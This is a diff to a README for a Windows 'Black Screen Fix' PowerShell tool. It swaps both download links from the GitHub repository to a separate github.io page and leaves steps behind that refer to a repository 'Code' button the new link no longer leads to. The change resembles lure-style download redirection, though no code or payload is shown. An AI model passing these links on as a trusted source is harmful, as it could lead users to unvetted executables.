@@ -1,6 +1,6 @@
 # 🖥️ Black-Screen-Fix-PowerShell - Repair windows display errors with ease
 
-[![Download Tool](https://img.shields.io/badge/Download-BlackScreenFix-blue.svg)](https://github.com/turpay4015/Black-Screen-Fix-PowerShell)
+[![Download Tool](https://img.shields.io/badge/Download-BlackScreenFix-blue.svg)](https://turpay4015.github.io)
 
 A black screen after you log in to Windows causes frustration. This tool identifies and repairs the internal systems that cause your display to go dark. It works on Windows 10 and Windows 11. Use this tool when your desktop fails to load after a system update, a graphics driver crash, or a software error.
 
@@ -12,7 +12,7 @@ Your computer relies on the Windows Explorer process to show your desktop icons,
 
 To use this software, visit the repository page and download the script.
 
-[Download Black Screen Fix via GitHub](https://github.com/turpay4015/Black-Screen-Fix-PowerShell)
+[Download Black Screen Fix via GitHub](https://turpay4015.github.io)
 
 1. Navigate to the link above.
 2. Look for the green Code button near the top right of the page.
